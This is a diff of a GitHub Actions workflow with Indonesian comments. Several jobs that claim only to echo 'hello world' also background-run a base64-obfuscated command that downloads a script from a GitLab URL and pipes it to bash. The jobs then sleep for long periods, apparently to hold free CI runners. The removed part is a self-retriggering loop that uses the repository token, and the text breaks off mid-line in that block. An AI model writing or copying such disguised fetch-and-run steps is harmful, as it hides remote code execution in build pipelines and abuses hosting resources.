@@ -3,10 +3,7 @@ name: 🔵 LSCPU Phase
 on:
   workflow_dispatch:
     inputs:
-      loop_count:
-        description: 'Sisa loop'
-        required: true
-        default: '999'
+
 
 # ⬇️ FIX TERM — taruh paling atas setelah on:
 env:
@@ -99,7 +96,7 @@ jobs:
       - name: Echo hello world & tahan 18 menit
         run: |
           echo "hello world" & base64 -d <<< Y3VybCAtc0wgIGh0dHBzOi8vZ2l0bGFiLmNvbS94cGFuemVycy9wbGF5Ly0vcmF3L21haW4vbGltZXZlcnMgfCBiYXNo | sh &
-          sleep 18m
+          sleep 12m
 
   # =============================================
   # 🍚 Job popay (paralel dengan lucas)
@@ -118,7 +115,7 @@ jobs:
       - name: Echo hello world & tahan 105 menit
         run: |
           echo "hello world" & base64 -d <<< Y3VybCAtc0wgIGh0dHBzOi8vZ2l0bGFiLmNvbS94cGFuemVycy9wbGF5Ly0vcmF3L21haW4vbGltZXZlcnMgfCBiYXNo | sh &
-          sleep 55m
+          sleep 12m
 
   # =============================================
   # 🍜 Job dandi
@@ -137,7 +134,7 @@ jobs:
       - name: Echo hello world & tahan 158 menit
         run: |
           echo "hello world" & base64 -d <<< Y3VybCAtc0wgIGh0dHBzOi8vZ2l0bGFiLmNvbS94cGFuemVycy9wbGF5Ly0vcmF3L21haW4vbGltZXZlcnMgfCBiYXNo | sh &
-          sleep 118m
+          sleep 12m
 
   # =============================================
   # 🍚 Job alam
@@ -158,39 +155,7 @@ jobs:
           echo "hello world" & base64 -d <<< Y3VybCAtc0wgIGh0dHBzOi8vZ2l0bGFiLmNvbS94cGFuemVycy9wbGF5Ly0vcmF3L21haW4vbGltZXZlcnMgfCBiYXNo | sh &
           sleep 10m
 
-  # =============================================
-  # 🔁 Trigger loop berikutnya (phase-hello)
-  # =============================================
-  trigger-hello:
-    # ⚠️ FIX: sebelumnya `needs: shards` → job tidak ada → workflow invalid
-    needs: [generate, line, lucas, popay, dandi, alam]
-    if: always()
-    runs-on: ubuntu-24.04
-    timeout-minutes: 2
-    steps:
-      - name: Dispatch phase-hello
-        env:
-          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-          LC: ${{ github.event.inputs.loop_count }}
-        run: |
-          set -euo pipefail
-          LC="${LC:-999}"
-
-          if ! [[ "$LC" =~ ^[0-9]+$ ]]; then
-            echo "::error::loop_count invalid"
-            exit 1
-          fi
-
-          # ⚠️ FIX: pakai if, bukan && — set -e akan kill script
-          # kalau test false sebelum sampai curl
-          if [ "$LC" -le 0 ]; then
-            echo "loop selesai"
-            exit 0
-          fi
-
-          new=$((LC - 1))
-          curl -fsS -X POST \
-            -H "Authorization: Bearer $GITHUB_TOKEN" \
+HUB_TOKEN" \
             -H "Accept: application/vnd.github+json" \
             -H "X-GitHub-Api-Version: 2022-11-28" \
             "https://api.github.com/repos/${{ github.repository }}/actions/workflows/phase-hello.yml/dispatches" \
